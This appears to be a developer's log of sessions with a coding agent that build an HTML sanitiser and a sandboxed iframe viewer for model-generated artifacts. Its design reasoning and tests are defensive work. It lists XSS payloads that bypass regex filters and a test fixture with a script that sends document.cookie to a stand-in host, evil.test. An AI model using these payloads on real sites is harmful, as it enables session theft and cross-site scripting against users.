# Session 04 — artifact sanitisation and the viewer

## Goal

Render model-generated HTML in-app without creating an XSS hole, and be able to
explain to an evaluator exactly what is permitted and why.

## Prompt 1

> Write a sanitiser for model-generated HTML artifacts.

First version was regex-only:

```python
html = re.sub(r"<script.*?</script>", "", html, flags=re.S)
html = re.sub(r"\son\w+=\"[^\"]*\"", "", html)
```

I pushed back with the payloads that defeat it, because "strip script tags with
a regex" is the canonical example of a sanitiser that does not work:

- `<img src=x onerror=alert(1)>` — unquoted attribute, the pattern requires quotes
- `<scr<script>ipt>` — the removal reassembles a valid tag
- `<svg/onload=alert(1)>` — no space before the handler
- `<a href="javascript:alert(1)">` — not a tag or a handler at all

Rewrote around `bleach` with an explicit tag and attribute allowlist, plus a
CSS sanitiser, with the regex pass kept only as a *pre-filter* for the
structural things bleach does not judge (meta refresh, `data:text/html` URLs).

## Prompt 2 — the design question

> How should the viewer render this safely?

The agent's answer was "sanitise, then `dangerouslySetInnerHTML`." I rejected
the architecture, not the code:

> Sanitisation is not an isolation boundary — it is a filter, and filters have
> bypasses. If the content renders in our origin, one bypass reads the user's
> session. The content has to render somewhere it cannot reach us, and then
> sanitisation becomes defence in depth instead of the only defence.

Settled on three layers, with the third doing the real work:

| Layer | Blocks | Load-bearing |
|---|---|---|
| Server sanitiser + CSP meta | scripts, frames, forms, handlers, `javascript:`, network egress | no |
| DOMPurify client-side | anything a compromised backend might pass | no |
| `<iframe srcdoc sandbox>` **without** `allow-same-origin` | everything — opaque origin | **yes** |

That distinction is now stated plainly in the module docstring, in
`architecture.md` §6, and in the viewer's Security tab. An evaluator should not
have to reverse-engineer which layer matters.

## Prompt 3 — should scripts run at all?

Blocking scripts entirely makes interactive artifacts (a calculator, a toggle)
impossible. Allowing them is safe *because* of layer 3.

Decision: allow one inline `<script>`, but

- drop any script referencing `document.cookie` or `localStorage` even though
  the sandbox already makes them useless — there is no legitimate reason for an
  artifact to contain them, so treat it as a signal;
- do not execute until the user presses **Run scripts**;
- report `scripts_kept` in the sanitiser report so the state is visible.

## Prompt 4 — test it properly

> Write tests using real XSS payloads, not toy input.

```python
XSS = """<div>hi</div>
<script>fetch('https://evil.test/steal?c='+document.cookie)</script>
<img src=x onerror="alert(1)">
<a href="javascript:alert(2)">click</a>
<iframe src="https://evil.test"></iframe>
<form action="https://evil.test"><input name="p"></form>
<base href="https://evil.test">
"""
```

Nine sanitiser tests, including the inverse case — that safe content (`<style>`,
tables, inline SVG) survives untouched with an empty `removed` list. A
sanitiser that strips everything passes every security test and is useless.

One thing the tests caught: the first `_wrap_document` implementation always
wrapped output in a fresh `<html>` shell, so a model that emitted a complete
document ended up with two `<head>` elements. Fixed to detect an existing
document and inject the CSP into its head instead.

## Prompt 5 — keep the original

I asked for the unsanitised output to be stored alongside the clean version.
`GET /api/artifacts/{id}/raw` returns it. Without this, "the sanitiser broke my
artifact" is unfalsifiable — you cannot diff what you did not keep.

## Outcome

9 sanitiser tests plus artifact round-trip tests green. The viewer's Security
tab renders the report, the sandbox in force, and the CSP.
